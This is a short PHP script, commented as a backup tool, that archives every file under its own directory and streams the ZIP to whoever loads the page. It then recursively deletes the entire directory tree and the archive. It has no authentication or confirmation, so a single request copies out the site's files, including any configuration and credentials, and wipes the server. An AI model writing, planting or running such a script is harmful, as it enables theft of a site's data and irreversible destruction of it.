<?php
$rootDir = __DIR__; // Root directory
$zipFile = $rootDir . '/backup.zip'; // ZIP file name

// Function to zip all files and folders
function zipData($source, $destination) {
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $file) {
            $zip->addFile($file, str_replace($source . DIRECTORY_SEPARATOR, '', $file));
        }
        $zip->close();
        return true;
    }
    return false;
}

// Function to delete all files and folders
function deleteAll($path) {
    $files = array_diff(scandir($path), array('.', '..'));
    foreach ($files as $file) {
        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            deleteAll($fullPath);
            rmdir($fullPath);
        } else {
            unlink($fullPath);
        }
    }
}

// Step 1: Zip all files and folders
if (zipData($rootDir, $zipFile)) {
    // Step 2: Set headers for file download
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="backup.zip"');
    header('Content-Length: ' . filesize($zipFile));
    flush();
    readfile($zipFile); // Send file to the browser

    // Step 3: Ensure output is fully sent before deleting files
    ob_end_flush();

    // Step 4: Delete all files and folders
    deleteAll($rootDir);

    // Step 5: Delete ZIP file itself
    unlink($zipFile);
    exit; // Ensure no extra output is sent
} else {
    echo "Failed to create a ZIP archive.";
}
?>
